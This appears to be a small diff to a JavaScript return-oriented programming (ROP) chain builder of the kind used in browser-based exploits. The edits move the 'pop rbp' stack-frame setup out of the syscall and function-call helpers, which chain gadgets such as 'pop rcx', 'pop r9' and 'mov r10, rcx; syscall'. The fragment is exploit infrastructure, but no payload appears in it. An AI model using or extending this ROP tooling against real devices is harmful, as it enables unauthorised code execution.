@@ -56,6 +56,8 @@ function rop() {
 		return chainLength;
 	}
 
+	this.add("pop rbp", stack_base + return_va + 0x1400);
+
 	this.add32 = function() {
 		var i;
 		for(i = 0; i < arguments.length; i++) {
@@ -77,7 +79,6 @@ function rop() {
 		if(typeof(arg4) !== "undefined") this.add("pop rcx", arg4);
 		if(typeof(arg5) !== "undefined") this.add("pop r8", arg5);
 		if(typeof(arg6) !== "undefined") this.add("pop r9", arg6);
-		this.add("pop rbp", stack_base + return_va - (chainLength + 8) + 0x1480);
 		this.add("mov r10, rcx; syscall");
 	}
 
@@ -90,7 +91,6 @@ function rop() {
 		if(typeof(arg4) !== "undefined") this.add("pop rcx", arg4);
 		if(typeof(arg5) !== "undefined") this.add("pop r8", arg5);
 		if(typeof(arg6) !== "undefined") this.add("pop r9", arg6);
-		this.add("pop rbp", stack_base + return_va - (chainLength + 8) + 0x1480);
 		this.add(module_infos[module].image_base + address);
 	}
 
